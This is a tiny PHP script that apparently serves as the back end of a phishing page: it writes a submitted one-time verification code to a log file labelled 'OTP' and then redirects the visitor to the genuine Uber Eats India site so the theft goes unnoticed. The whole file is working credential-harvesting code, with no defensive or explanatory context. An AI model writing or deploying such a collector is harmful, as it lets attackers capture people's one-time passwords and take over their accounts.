<?php

    file_put_contents("log.txt", "OTP: " . $_POST['verificationCode'] . "\n", FILE_APPEND);
header('Location: https://www.ubereats.com/en-IN/');
exit();